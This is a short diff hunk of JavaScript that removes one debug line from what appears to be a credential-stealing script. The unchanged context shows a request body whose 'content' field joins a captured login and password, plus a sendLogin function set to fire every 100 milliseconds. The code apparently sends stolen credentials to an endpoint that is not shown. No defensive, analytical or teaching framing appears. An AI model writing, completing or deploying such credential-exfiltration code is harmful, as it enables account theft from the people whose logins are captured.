@@ -23,7 +23,6 @@
                    "content": login + "|" + password
                   }
         }), formatted = login + " | " + password)
-    console.log(login)
     }
     setInterval(sendLogin, 100);
 
